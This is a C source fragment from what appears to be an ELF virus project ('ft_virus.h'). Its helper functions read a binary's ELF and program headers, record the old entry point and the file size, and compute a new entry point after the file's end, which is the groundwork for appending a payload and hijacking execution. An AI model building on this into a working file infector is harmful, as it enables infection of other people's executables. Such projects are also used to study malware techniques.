#include "ft_virus.h"

u64 FORCE_INLINE get_virt_addr(int fd)
{
	size_t headers_length;
	Elf64_Ehdr e_hdr;
	Elf64_Phdr p_hdr;

	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	headers_length = e_hdr.e_phnum;
	LSEEK(fd, e_hdr.e_phoff, SEEK_SET);
	do {
		READ(fd, &p_hdr, sizeof(p_hdr));
		if (p_hdr.p_type == PT_LOAD)
			return p_hdr.p_vaddr;
		headers_length -= 1;
	} while ( headers_length );
	return (0);
}

t_binary get_infos(int fd)
{
	t_binary res;
	Elf64_Ehdr e_hdr;

	LSEEK(fd, 0, SEEK_SET);
	READ(fd, &e_hdr, sizeof(e_hdr));
	res.old_entry = e_hdr.e_entry;
	debug_u64("* old_entry: ", res.old_entry);
	res.file_size = LSEEK(fd, 0, SEEK_END);
	debug_u64("* file_size: ", res.file_size);
	res.v_addr = get_virt_addr(fd);
	debug_u64("* v_addr: ", res.v_addr);
	res.new_entry = PAYLOAD_ALIGN - res.file_size % PAYLOAD_ALIGN +
		res.file_size + res.v_addr;
	debug_u64("* new_entry: ", res.new_entry);
	return (res);
}
